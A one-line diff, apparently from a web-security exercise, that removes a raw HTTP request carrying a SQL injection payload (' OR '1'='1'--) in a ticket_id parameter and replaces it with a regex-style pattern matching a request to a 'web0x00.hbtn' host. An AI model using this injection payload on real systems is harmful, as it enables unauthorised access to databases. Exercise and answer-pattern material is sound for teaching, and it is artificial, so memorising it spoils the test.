@@ -1,1 +1,1 @@
-plaintext GET /ticket/view?ticket_id=' OR '1'='1'-- HTTP/1.1 Host:example.com Cookie:session=valid_session_data
+GET \/ticket?id=.+ HTTP\/1\.1 Host:web0x00\.hbtn\..* Cookie: session=\..*
